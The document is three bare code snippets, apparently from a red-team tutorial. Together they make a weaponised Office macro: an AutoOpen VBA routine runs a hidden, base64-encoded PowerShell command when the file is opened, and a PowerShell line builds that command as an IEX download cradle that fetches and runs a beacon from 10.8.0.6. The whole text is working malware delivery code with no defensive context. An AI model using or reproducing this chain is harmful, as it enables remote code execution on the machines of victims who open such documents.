```
Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "<powershell command here>"
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub

```



```
Sub DoStuff()
    Dim wsh As Object
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -Sta -Nop -Window Hidden -EncodedCommand JABjAD0AbgBlAHcALQBvAGIAagBl[…snip…]AAUwB0AHMAMQAiACkAfABpAGUAeAA="
    Set wsh = Nothing
End Sub

Sub AutoOpen()
    DoStuff
End Sub

```
```

$Resilent = "IEX ((new-object net.webclient).downloadstring('http://10.8.0.6:80/http-beacon'))"
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Resilent))
```
